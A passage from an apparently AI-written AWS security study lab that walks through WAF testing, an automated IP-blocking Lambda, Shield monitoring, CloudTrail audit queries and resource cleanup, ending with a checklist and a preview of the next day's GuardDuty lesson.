+  echo "✅ New threat IP 198.18.0.1 added to blocklist" || \
+  echo "⚠️  Could not update IP set"
+
+# Step 5: Override managed rule to COUNT mode
+echo ""
+echo "[5] Overriding Core Rule Set to COUNT mode for testing..."
+echo "   (In production: test new rules before enforcing)"
+
+# Show the override pattern
+cat << 'EOF'
+# Override specific rule within managed rule group to COUNT:
+aws wafv2 update-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --id <web-acl-id> \
+  --default-action '{"Allow": {}}' \
+  --rules '[
+    {
+      "Name": "AWSManagedRulesCommonRuleSet",
+      "Priority": 2,
+      "OverrideAction": {"None": {}},
+      "Statement": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesCommonRuleSet",
+          "RuleActionOverrides": [
+            {
+              "Name": "SizeRestrictions_BODY",
+              "ActionToUse": {"Count": {}}
+            }
+          ]
+        }
+      },
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "AWSManagedRulesCommonRuleSet"
+      }
+    }
+  ]'
+
+# This overrides ONLY SizeRestrictions_BODY to COUNT
+# All other Core Rule Set rules remain as BLOCK
+EOF
+
+# Step 6: WAF capacity check
+echo ""
+echo "[6] Checking Web ACL capacity usage..."
+aws wafv2 get-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --id $WEB_ACL_ID \
+  --query 'WebACL.{
+    Name:Name,
+    CapacityUsed:Capacity
+  }' \
+  --output table 2>/dev/null
+
+echo "   Maximum WCU per Web ACL: 5,000"
+
+echo ""
+echo "================================================"
+echo "Part 4 Complete!"
+echo "WAF testing demonstrated:"
+echo "  - Sampled requests inspection"
+echo "  - Test command reference"
+echo "  - CloudWatch metrics check"
+echo "  - Dynamic IP blocklist update"
+echo "  - Per-rule COUNT override pattern"
+echo "================================================"
+```
+
+---
+
+## Part 5 — Automated IP Blocking
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 5: Automated IP Blocking
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 5: Automated IP Blocking Pipeline"
+echo "================================================"
+
+# Step 1: Create Lambda for automated blocking
+echo ""
+echo "[1] Creating automated IP blocking Lambda..."
+
+mkdir -p /tmp/auto-block-lambda
+cat > /tmp/auto-block-lambda/lambda_function.py << PYEOF
+"""
+Automated WAF IP blocking Lambda
+Triggered by CloudWatch alarm → SNS → Lambda
+Adds offending IP to WAF blocklist automatically
+"""
+import boto3
+import json
+import logging
+import re
+
+logger = logging.getLogger()
+logger.setLevel(logging.INFO)
+
+WAF_SCOPE = 'REGIONAL'
+IP_SET_NAME = 'Lab102-BlockedIPs'
+
+def lambda_handler(event, context):
+    """
+    Handles SNS notification from CloudWatch alarm
+    Extracts IP from alarm and adds to WAF IP set
+    """
+    waf = boto3.client('wafv2')
+
+    logger.info(f"Event received: {json.dumps(event)}")
+
+    # Parse SNS message
+    for record in event.get('Records', []):
+        if record.get('EventSource') == 'aws:sns':
+            message = json.loads(
+                record['Sns']['Message']
+            )
+            logger.info(f"Alarm: {message}")
+
+    # In production: extract IP from alarm dimensions
+    # For demo: show the pattern
+    offending_ip = extract_ip_from_event(event)
+
+    if offending_ip:
+        block_ip(waf, offending_ip)
+    else:
+        logger.info("No IP to block in this event")
+
+    return {'statusCode': 200}
+
+def extract_ip_from_event(event):
+    """Extract IP address from CloudWatch alarm event"""
+    try:
+        # Parse CloudWatch alarm message
+        message = json.loads(
+            event['Records'][0]['Sns']['Message']
+        )
+
+        # Extract from alarm description or dimensions
+        description = message.get(
+            'AlarmDescription', ''
+        )
+
+        # Simple IP extraction pattern
+        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
+        ips = re.findall(ip_pattern, description)
+
+        return f"{ips[0]}/32" if ips else None
+    except Exception as e:
+        logger.error(f"Error extracting IP: {e}")
+        return None
+
+def block_ip(waf, ip_cidr):
+    """Add IP to WAF IP set"""
+    try:
+        # Get current IP set
+        ip_sets = waf.list_ip_sets(Scope=WAF_SCOPE)
+        ip_set = next(
+            (s for s in ip_sets['IPSets']
+             if s['Name'] == IP_SET_NAME),
+            None
+        )
+
+        if not ip_set:
+            logger.error(f"IP set {IP_SET_NAME} not found")
+            return
+
+        # Get current addresses and lock token
+        current = waf.get_ip_set(
+            Name=IP_SET_NAME,
+            Scope=WAF_SCOPE,
+            Id=ip_set['Id']
+        )
+
+        addresses = current['IPSet']['Addresses']
+        lock_token = current['LockToken']
+
+        # Add new IP if not already blocked
+        if ip_cidr not in addresses:
+            addresses.append(ip_cidr)
+
+            waf.update_ip_set(
+                Name=IP_SET_NAME,
+                Scope=WAF_SCOPE,
+                Id=ip_set['Id'],
+                Addresses=addresses,
+                LockToken=lock_token
+            )
+            logger.info(f"✅ Blocked IP: {ip_cidr}")
+        else:
+            logger.info(f"IP {ip_cidr} already blocked")
+
+    except Exception as e:
+        logger.error(f"Error blocking IP: {e}")
+        raise
+PYEOF
+
+# Package Lambda
+cd /tmp/auto-block-lambda
+zip -r /tmp/auto-block-lambda.zip \
+  lambda_function.py 2>/dev/null && \
+  echo "✅ Lambda package created"
+
+# Create Lambda execution role
+cat > /tmp/autoblock-trust.json << 'EOF'
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "lambda.amazonaws.com"
+      },
+      "Action": "sts:AssumeRole"
+    }
+  ]
+}
+EOF
+
+AUTOBLOCK_ROLE_ARN=$(aws iam create-role \
+  --role-name "Lab102-AutoBlockRole" \
+  --assume-role-policy-document \
+    file:///tmp/autoblock-trust.json \
+  --query 'Role.Arn' \
+  --output text 2>/dev/null)
+
+echo "Auto-block role: $AUTOBLOCK_ROLE_ARN"
+echo "export AUTOBLOCK_ROLE_ARN=\"$AUTOBLOCK_ROLE_ARN\"" \
+  >> /tmp/lab102-env.sh
+
+# Attach WAF update policy
+cat > /tmp/autoblock-policy.json << EOF
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "wafv2:GetIPSet",
+        "wafv2:UpdateIPSet",
+        "wafv2:ListIPSets"
+      ],
+      "Resource": "$BLOCKED_IPS_ARN"
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "wafv2:ListIPSets"
+      ],
+      "Resource": "*"
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+EOF
+
+aws iam put-role-policy \
+  --role-name "Lab102-AutoBlockRole" \
+  --policy-name "Lab102-AutoBlockPolicy" \
+  --policy-document \
+    file:///tmp/autoblock-policy.json \
+  2>/dev/null && \
+  echo "✅ Auto-block policy attached"
+
+sleep 10  # Wait for IAM propagation
+
+# Create Lambda function
+AUTOBLOCK_LAMBDA_ARN=$(aws lambda create-function \
+  --function-name "Lab102-AutoIPBlock" \
+  --runtime python3.11 \
+  --handler lambda_function.lambda_handler \
+  --role $AUTOBLOCK_ROLE_ARN \
+  --zip-file fileb:///tmp/auto-block-lambda.zip \
+  --description "Lab102 automated WAF IP blocking" \
+  --timeout 30 \
+  --environment \
+    Variables="{WAF_IP_SET_ID=$BLOCKED_IPS_ID}" \
+  --tags Lab=Lab102 \
+  --query 'FunctionArn' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$AUTOBLOCK_LAMBDA_ARN" ]; then
+  echo "✅ Auto-block Lambda created"
+  echo "   ARN: $AUTOBLOCK_LAMBDA_ARN"
+  echo "export AUTOBLOCK_LAMBDA_ARN=\"$AUTOBLOCK_LAMBDA_ARN\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+# Step 2: Create CloudWatch alarm for high block rate
+echo ""
+echo "[2] Creating CloudWatch alarm for high block rate..."
+aws cloudwatch put-metric-alarm \
+  --alarm-name "Lab102-WAFHighBlockRate" \
+  --alarm-description "WAF blocking unusually high request volume" \
+  --metric-name BlockedRequests \
+  --namespace AWS/WAFV2 \
+  --dimensions \
+    Name=WebACL,Value=Lab102-WebACL \
+    Name=Region,Value=$REGION \
+    Name=Rule,Value=ALL \
+  --statistic Sum \
+  --period 300 \
+  --threshold 1000 \
+  --comparison-operator GreaterThanThreshold \
+  --evaluation-periods 1 \
+  --treat-missing-data notBreaching \
+  2>/dev/null && \
+  echo "✅ CloudWatch alarm created" || \
+  echo "⚠️  Could not create alarm"
+
+# Step 3: Show full automated blocking architecture
+echo ""
+echo "[3] Automated blocking architecture summary..."
+cat << 'EOF'
+Full automated IP blocking pipeline:
+
+1. WAF blocks request (rate limit / attack pattern)
+2. CloudWatch alarm fires (high block rate)
+3. SNS notification sent
+4. Lambda triggered
+5. Lambda extracts offending IP
+6. Lambda adds IP to WAF IP Set
+7. All future requests from IP blocked immediately
+
+Additional automation patterns:
+├── GuardDuty finding → EventBridge → Lambda → WAF block
+├── Security Hub finding → Lambda → WAF block
+└── SIEM alert → Lambda → WAF block via API
+EOF
+
+echo ""
+echo "================================================"
+echo "Part 5 Complete!"
+echo "Automated blocking pipeline:"
+echo "  CloudWatch alarm → SNS → Lambda → WAF IP Set"
+echo "================================================"
+```
+
+---
+
+## Part 6 — Shield Reference & Monitoring
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 6: Shield Reference & Monitoring
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 6: Shield Reference & Monitoring"
+echo "================================================"
+
+# Step 1: Check current Shield subscription
+echo ""
+echo "[1] Checking Shield subscription status..."
+aws shield describe-subscription \
+  --output json 2>/dev/null | \
+  python3 -m json.tool || \
+  echo "Shield Advanced not subscribed"
+echo "Note: Shield Standard is always active (free)"
+
+# Step 2: Shield Advanced reference commands
+echo ""
+echo "[2] Shield Advanced reference commands..."
+cat << 'EOF'
+# Subscribe to Shield Advanced (1-year commitment):
+aws shield create-subscription
+
+# Add ALB to Shield Advanced protection:
+aws shield create-protection \
+  --name "Lab102-ALB-Protection" \
+  --resource-arn <alb-arn>
+
+# Add CloudFront to Shield Advanced protection:
+aws shield create-protection \
+  --name "Lab102-CF-Protection" \
+  --resource-arn <cloudfront-arn>
+
+# Add Route 53 to Shield Advanced protection:
+aws shield create-protection \
+  --name "Lab102-R53-Protection" \
+  --resource-arn <hosted-zone-arn>
+
+# List protected resources:
+aws shield list-protections \
+  --query 'Protections[*].{
+    Name:Name,
+    ResourceArn:ResourceArn,
+    Id:Id
+  }' \
+  --output table
+
+# Associate WAF Web ACL with Shield protection:
+aws shield associate-drt-log-bucket \
+  --log-bucket <s3-bucket>
+
+# Enable proactive engagement:
+aws shield enable-proactive-engagement
+
+# Add emergency contact for SRT:
+aws shield update-emergency-contact-settings \
+  --emergency-contact-list \
+    EmailAddress=security@company.com,\
+PhoneNumber=+911234567890,\
+ContactNotes="Primary security contact"
+
+# Check active DDoS events:
+aws shield list-attacks \
+  --start-time $(date -u -d '7 days ago' \
+    '+%Y-%m-%dT%H:%M:%SZ') \
+  --end-time $(date -u '+%Y-%m-%dT%H:%M:%SZ')
+
+# Get attack details:
+aws shield describe-attack \
+  --attack-id <attack-id>
+EOF
+
+# Step 3: Check Shield Standard protections
+echo ""
+echo "[3] Checking Shield Standard active protections..."
+aws shield list-protections \
+  --output table 2>/dev/null || \
+  echo "No Shield Advanced protections configured"
+echo "Note: Shield Standard protects all resources automatically"
+
+# Step 4: DDoS protection architecture reference
+echo ""
+echo "[4] Recommended DDoS protection architecture..."
+cat << 'EOF'
+Complete DDoS protection stack:
+
+Layer 1 — DNS (Route 53)
+├── Shield Advanced protection on hosted zone
+├── Anycast routing absorbs DNS floods
+└── Route 53 DDoS resiliency built-in
+
+Layer 2 — CDN/Edge (CloudFront)
+├── Shield Advanced protection
+├── WAF Web ACL (us-east-1)
+├── Rate limiting at edge
+└── Geographic distribution absorbs volumetric attacks
+
+Layer 3 — Load Balancer (ALB)
+├── Shield Advanced protection
+├── WAF Web ACL (regional)
+├── Connection rate limiting
+└── Security Groups (CloudFront IPs only)
+
+Layer 4 — Compute (EC2/ECS)
+├── Auto Scaling (absorb + signal attack)
+├── Security Groups (ALB only)
+└── No public IPs on application servers
+
+Layer 5 — Response
+├── CloudWatch alarms on traffic anomalies
+├── EventBridge → Lambda → WAF automated response
+└── SRT engagement via Shield Advanced
+EOF
+
+# Step 5: Create EventBridge rule for DDoS detection
+echo ""
+echo "[5] Creating EventBridge rule for DDoS detection..."
+aws events put-rule \
+  --name "Lab102-DDoSDetection" \
+  --event-pattern '{
+    "source": ["aws.shield"],
+    "detail-type": [
+      "Shield Advanced - DDoS Attack Detected"
+    ]
+  }' \
+  --state ENABLED \
+  --description "Alert on Shield DDoS detection" \
+  --output table 2>/dev/null && \
+  echo "✅ DDoS detection EventBridge rule created"
+
+# Step 6: Create CloudWatch dashboard for WAF metrics
+echo ""
+echo "[6] Creating CloudWatch dashboard for WAF..."
+aws cloudwatch put-dashboard \
+  --dashboard-name "Lab102-WAF-Dashboard" \
+  --dashboard-body "{
+    \"widgets\": [
+      {
+        \"type\": \"metric\",
+        \"properties\": {
+          \"title\": \"WAF Blocked vs Allowed Requests\",
+          \"metrics\": [
+            [\"AWS/WAFV2\", \"BlockedRequests\",
+             \"WebACL\", \"Lab102-WebACL\",
+             \"Region\", \"$REGION\",
+             \"Rule\", \"ALL\"],
+            [\"AWS/WAFV2\", \"AllowedRequests\",
+             \"WebACL\", \"Lab102-WebACL\",
+             \"Region\", \"$REGION\",
+             \"Rule\", \"ALL\"]
+          ],
+          \"period\": 300,
+          \"stat\": \"Sum\",
+          \"view\": \"timeSeries\"
+        }
+      }
+    ]
+  }" 2>/dev/null && \
+  echo "✅ CloudWatch dashboard created" || \
+  echo "⚠️  Could not create dashboard"
+
+echo ""
+echo "================================================"
+echo "Part 6 Complete!"
+echo "Shield monitoring configured:"
+echo "  - EventBridge DDoS detection rule"
+echo "  - CloudWatch WAF dashboard"
+echo "  - Shield Advanced reference commands"
+echo "  - Full DDoS architecture documented"
+echo "================================================"
+```
+
+---
+
+## Part 7 — CloudTrail Audit
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 7: CloudTrail Audit
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 7: CloudTrail Audit"
+echo "================================================"
+
+# Step 1: Search WAF events
+echo ""
+echo "[1] Searching CloudTrail for WAF events..."
+aws cloudtrail lookup-events \
+  --lookup-attributes \
+    AttributeKey=EventSource,\
+AttributeValue=wafv2.amazonaws.com \
+  --max-results 20 \
+  --query 'Events[*].{
+    Time:EventTime,
+    Event:EventName,
+    User:Username
+  }' \
+  --output table 2>/dev/null
+
+# Step 2: Search for Web ACL creation
+echo ""
+echo "[2] Searching for CreateWebACL events..."
+aws cloudtrail lookup-events \
+  --lookup-attributes \
+    AttributeKey=EventName,\
+AttributeValue=CreateWebACL \
+  --query 'Events[*].{
+    Time:EventTime,
+    User:Username,
+    Event:EventName
+  }' \
+  --output table 2>/dev/null
+
+# Step 3: Search for IP set updates
+echo ""
+echo "[3] Searching for UpdateIPSet events..."
+aws cloudtrail lookup-events \
+  --lookup-attributes \
+    AttributeKey=EventName,\
+AttributeValue=UpdateIPSet \
+  --query 'Events[*].{
+    Time:EventTime,
+    User:Username
+  }' \
+  --output table 2>/dev/null
+
+# Step 4: Key events summary
+echo ""
+echo "[4] Key WAF/Shield CloudTrail events..."
+cat << 'EOF'
+┌──────────────────────────────────┬────────────────────────────┐
+│ WAF Event                        │ Security Significance      │
+├──────────────────────────────────┼────────────────────────────┤
+│ CreateWebACL                     │ New WAF protection added   │
+│ DeleteWebACL                     │ WAF protection removed     │
+│ UpdateWebACL                     │ Rules changed              │
+│ AssociateWebACL                  │ WAF applied to resource    │
+│ DisassociateWebACL               │ WAF removed from resource  │
+│ UpdateIPSet                      │ IP blocklist/allowlist chg │
+│ PutLoggingConfiguration          │ Logging enabled/changed    │
+│ DeleteLoggingConfiguration       │ Logging disabled           │
+├──────────────────────────────────┼────────────────────────────┤
+│ Shield Event                     │ Security Significance      │
+├──────────────────────────────────┼────────────────────────────┤
+│ CreateSubscription               │ Shield Advanced enabled    │
+│ CreateProtection                 │ Resource protected         │
+│ DeleteProtection                 │ Protection removed         │
+│ EnableProactiveEngagement        │ SRT proactive mode on      │
+│ DisableProactiveEngagement       │ SRT proactive mode off     │
+└──────────────────────────────────┴────────────────────────────┘
+EOF
+
+echo ""
+echo "================================================"
+echo "Part 7 Complete!"
+echo "================================================"
+```
+
+---
+
+## Part 8 — Cleanup
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 8: Cleanup
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 8: Lab Cleanup"
+echo "================================================"
+
+# Step 1: Disassociate Web ACL from ALB
+echo ""
+echo "[1] Disassociating Web ACL from resources..."
+ALB_ARN=$(aws elbv2 describe-load-balancers \
+  --query 'LoadBalancers[0].LoadBalancerArn' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$ALB_ARN" ] && \
+   [ "$ALB_ARN" != "None" ]; then
+  aws wafv2 disassociate-web-acl \
+    --resource-arn $ALB_ARN 2>/dev/null && \
+    echo "✅ Web ACL disassociated from ALB"
+fi
+
+# Step 2: Delete logging configuration
+echo ""
+echo "[2] Removing WAF logging configuration..."
+aws wafv2 delete-logging-configuration \
+  --resource-arn $WEB_ACL_ARN 2>/dev/null && \
+  echo "✅ Logging configuration removed"
+
+# Step 3: Delete Web ACLs
+echo ""
+echo "[3] Deleting Web ACLs..."
+
+# Delete regional Web ACL
+aws wafv2 delete-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --id $WEB_ACL_ID \
+  --lock-token $(aws wafv2 get-web-acl \
+    --name "Lab102-WebACL" \
+    --scope REGIONAL \
+    --id $WEB_ACL_ID \
+    --query 'LockToken' \
+    --output text 2>/dev/null) \
+  2>/dev/null && \
+  echo "✅ Regional Web ACL deleted" || \
+  echo "⚠️  Could not delete regional Web ACL"
+
+# Delete CloudFront Web ACL (us-east-1)
+CF_WEB_ACL_ID=$(aws wafv2 list-web-acls \
+  --scope CLOUDFRONT \
+  --region us-east-1 \
+  --query \
+    'WebACLs[?Name==`Lab102-CloudFrontWebACL`].Id' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$CF_WEB_ACL_ID" ] && \
+   [ "$CF_WEB_ACL_ID" != "None" ]; then
+  aws wafv2 delete-web-acl \
+    --name "Lab102-CloudFrontWebACL" \
+    --scope CLOUDFRONT \
+    --region us-east-1 \
+    --id $CF_WEB_ACL_ID \
+    --lock-token $(aws wafv2 get-web-acl \
+      --name "Lab102-CloudFrontWebACL" \
+      --scope CLOUDFRONT \
+      --region us-east-1 \
+      --id $CF_WEB_ACL_ID \
+      --query 'LockToken' \
+      --output text 2>/dev/null) \
+    2>/dev/null && \
+    echo "✅ CloudFront Web ACL deleted"
+fi
+
+# Step 4: Delete rule group
+echo ""
+echo "[4] Deleting custom rule group..."
+aws wafv2 delete-rule-group \
+  --name "Lab102-CustomRuleGroup" \
+  --scope REGIONAL \
+  --id $RULE_GROUP_ID \
+  --lock-token $(aws wafv2 get-rule-group \
+    --name "Lab102-CustomRuleGroup" \
+    --scope REGIONAL \
+    --id $RULE_GROUP_ID \
+    --query 'LockToken' \
+    --output text 2>/dev/null) \
+  2>/dev/null && \
+  echo "✅ Rule group deleted"
+
+# Step 5: Delete IP sets
+echo ""
+echo "[5] Deleting IP sets..."
+for IP_SET_NAME in \
+  "Lab102-BlockedIPs" \
+  "Lab102-CorporateIPs"; do
+  IP_SET_ID=$(aws wafv2 list-ip-sets \
+    --scope REGIONAL \
+    --query \
+      "IPSets[?Name=='$IP_SET_NAME'].Id" \
+    --output text 2>/dev/null)
+
+  if [ ! -z "$IP_SET_ID" ] && \
+     [ "$IP_SET_ID" != "None" ]; then
+    aws wafv2 delete-ip-set \
+      --name $IP_SET_NAME \
+      --scope REGIONAL \
+      --id $IP_SET_ID \
+      --lock-token $(aws wafv2 get-ip-set \
+        --name $IP_SET_NAME \
+        --scope REGIONAL \
+        --id $IP_SET_ID \
+        --query 'LockToken' \
+        --output text 2>/dev/null) \
+      2>/dev/null && \
+      echo "✅ Deleted IP set: $IP_SET_NAME"
+  fi
+done
+
+# Step 6: Delete regex pattern set
+echo ""
+echo "[6] Deleting regex pattern set..."
+aws wafv2 delete-regex-pattern-set \
+  --name "Lab102-SQLiPatterns" \
+  --scope REGIONAL \
+  --id $REGEX_ID \
+  --lock-token $(aws wafv2 get-regex-pattern-set \
+    --name "Lab102-SQLiPatterns" \
+    --scope REGIONAL \
+    --id $REGEX_ID \
+    --query 'LockToken' \
+    --output text 2>/dev/null) \
+  2>/dev/null && \
+  echo "✅ Regex pattern set deleted"
+
+# Step 7: Delete Lambda functions
+echo ""
+echo "[7] Deleting Lambda functions..."
+aws lambda delete-function \
+  --function-name "Lab102-AutoIPBlock" \
+  2>/dev/null && echo "✅ Auto-block Lambda deleted"
+
+# Step 8: Delete IAM roles
+echo ""
+echo "[8] Cleaning up IAM roles..."
+for ROLE in \
+  "Lab102-FirehoseRole" \
+  "Lab102-AutoBlockRole"; do
+  # Detach inline policies
+  aws iam delete-role-policy \
+    --role-name $ROLE \
+    --policy-name "${ROLE#Lab102-}Policy" \
+    2>/dev/null
+
+  aws iam delete-role \
+    --role-name $ROLE 2>/dev/null && \
+    echo "✅ Deleted role: $ROLE"
+done
+
+# Step 9: Delete Kinesis Firehose
+echo ""
+echo "[9] Deleting Kinesis Firehose..."
+aws firehose delete-delivery-stream \
+  --delivery-stream-name "aws-waf-logs-lab102" \
+  2>/dev/null && echo "✅ Firehose deleted"
+
+# Step 10: Delete S3 bucket
+echo ""
+echo "[10] Deleting WAF log S3 bucket..."
+aws s3 rm s3://$WAF_LOG_BUCKET \
+  --recursive 2>/dev/null
+aws s3 rb s3://$WAF_LOG_BUCKET \
+  2>/dev/null && echo "✅ WAF log bucket deleted"
+
+# Step 11: Delete EventBridge rules
+echo ""
+echo "[11] Deleting EventBridge rules..."
+aws events delete-rule \
+  --name "Lab102-DDoSDetection" \
+  --force 2>/dev/null && \
+  echo "✅ DDoS detection rule deleted"
+
+# Step 12: Delete CloudWatch resources
+echo ""
+echo "[12] Deleting CloudWatch resources..."
+aws cloudwatch delete-alarms \
+  --alarm-names "Lab102-WAFHighBlockRate" \
+  2>/dev/null && echo "✅ CloudWatch alarm deleted"
+
+aws cloudwatch delete-dashboards \
+  --dashboard-names "Lab102-WAF-Dashboard" \
+  2>/dev/null && echo "✅ CloudWatch dashboard deleted"
+
+aws logs delete-log-group \
+  --log-group-name "aws-waf-logs/lab102" \
+  2>/dev/null && echo "✅ Log group deleted"
+
+# Step 13: Cleanup temp files
+echo ""
+echo "[13] Cleaning up temp files..."
+rm -f /tmp/lab102-env.sh \
+      /tmp/firehose-trust.json \
+      /tmp/firehose-policy.json \
+      /tmp/autoblock-trust.json \
+      /tmp/autoblock-policy.json \
+      /tmp/auto-block-lambda.zip
+rm -rf /tmp/auto-block-lambda/
+echo "✅ Temp files cleaned"
+
+echo ""
+echo "================================================"
+echo "Lab 102 Cleanup Complete!"
+echo "All resources deleted."
+echo "================================================"
+```
+
+---
+
+## ✅ Lab 102 Verification Checklist
+
+```
+Lab 102 — Completion Checklist
+│
+├── Prerequisites
+│     ├── [ ] Verified identity and region
+│     └── [ ] Checked existing WAF and Shield config
+│
+├── Part 1: IP Sets & Rule Groups
+│     ├── [ ] Created blocked IPs set
+│     ├── [ ] Created corporate allowlist
+│     ├── [ ] Created SQLi regex pattern set
+│     └── [ ] Created custom rule group (scanner block)
+│
+├── Part 2: Web ACL Creation
+│     ├── [ ] Created regional Web ACL (9 rules)
+│     ├── [ ] Verified rule priority order
+│     ├── [ ] Created CloudFront Web ACL (us-east-1)
+│     └── [ ] Understood ALB association
+│
+├── Part 3: WAF Logging
+│     ├── [ ] Created S3 bucket (aws-waf-logs- prefix)
+│     ├── [ ] Configured S3 lifecycle
+│     ├── [ ] Created Kinesis Firehose
+│     ├── [ ] Enabled WAF logging
+│     └── [ ] Applied BLOCK-only log filter
+│
+├── Part 4: Testing
+│     ├── [ ] Checked sampled requests
+│     ├── [ ] Know curl test commands
+│     ├── [ ] Updated IP blocklist dynamically
+│     └── [ ] Understood per-rule COUNT override
+│
+├── Part 5: Automated Blocking
+│     ├── [ ] Created auto-block Lambda
+│     ├── [ ] Created CloudWatch alarm
+│     └── [ ] Understood full automation pipeline
+│
+├── Part 6: Shield
+│     ├── [ ] Know Shield Advanced commands
+│     ├── [ ] Created DDoS detection rule
+│     ├── [ ] Created WAF dashboard
+│     └── [ ] Understood full DDoS architecture
+│
+├── Part 7: CloudTrail Audit
+│     ├── [ ] Searched WAF events
+│     └── [ ] Know key events to monitor
+│
+└── Part 8: Cleanup
+      └── [ ] All resources deleted
+```
+
+---
+
+## 🔑 Lab 102 Key Takeaways
+
+| Concept | What You Practiced |
+|---|---|
+| Rule priority order | Lower number = evaluated first |
+| COUNT vs BLOCK | COUNT continues evaluation, BLOCK stops |
+| CloudFront WAF region | Must be us-east-1 with CLOUDFRONT scope |
+| IP sets | Dynamic blocklist/allowlist |
+| Regex pattern sets | Custom attack pattern matching |
+| Custom rule groups | Reusable rule collections |
+| Rate-based rules | Scope-down to specific endpoints |
+| Managed rule groups | AWS Core Rule Set, IP Reputation |
+| WAF logging | Must use aws-waf-logs- bucket prefix |
+| Log filtering | BLOCK-only reduces log volume |
+| Automated blocking | CloudWatch → Lambda → WAF IP Set |
+| Lock tokens | Required for WAF resource updates |
+| Shield Standard | Always on, free, automatic |
+| Shield Advanced | SRT, cost protection, 1-year commitment |
+
+---
+
+# 🎉 Day 37 — Fully Complete!
+
+All three sections done at full depth:
+- ✅ **Section 1** — Full Theory (1.1 to 1.6)
+- ✅ **Section 2** — 20 Exam Q&A + Traps + Cheat Sheet
+- ✅ **Section 3** — Lab 102 (8 parts, full scripts)
+
+---
+
+## 📅 Day 38 Preview
+```
+Day 38: Amazon GuardDuty (3 hours)
+├── GuardDuty architecture and data sources
+├── Finding types and severity levels
+├── Threat intelligence integration
+├── Multi-account GuardDuty with Organizations
+├── GuardDuty Malware Protection
+├── Automated response to findings
+└── Lab 103: GuardDuty setup and finding analysis
+```
+
+Ready when you are Pradeep! 💪
